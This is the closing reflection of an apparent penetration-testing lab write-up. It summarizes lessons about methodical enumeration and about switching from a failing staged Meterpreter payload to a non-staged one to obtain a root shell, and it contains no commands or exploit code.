> **Enumeration drives exploitation.**

Every piece of information gathered during reconnaissance contributed to making an informed decision later in the assessment. Rather than immediately attempting exploits, the process involved:

* Identifying exposed services.
* Understanding software versions.
* Researching known vulnerabilities.
* Prioritizing attack surfaces.
* Validating assumptions through enumeration.

Perhaps the biggest lesson learned was that:

> **A failed payload does not necessarily mean a failed exploit.**

When the initial Meterpreter payload repeatedly died, it would have been easy to conclude that the target was not vulnerable. Instead, analyzing the behavior of the exploit and adapting to the target's environment led to the realization that the vulnerability had likely been triggered successfully and that only the payload was failing.

By switching to a simpler, non-staged payload, exploitation succeeded immediately.

This write-up also helped develop several important penetration testing skills:

* Conducting methodical reconnaissance.
* Enumerating services instead of relying on assumptions.
* Researching vulnerabilities based on version information.
* Correlating findings across multiple services.
* Troubleshooting failed exploitation attempts.
* Adapting attack techniques to legacy environments.
* Maintaining persistence when initial approaches fail.

Most importantly, this machine demonstrated that penetration testing is rarely a straight path from scan to shell. Successful assessments often depend on patience, curiosity, and the ability to adapt when things do not work as expected.

Completing this write-up not only resulted in obtaining a root shell on the target but also provided valuable experience in thinking like a penetration tester—using evidence gathered during enumeration to guide decisions, troubleshoot failures, and ultimately achieve successful compromise.
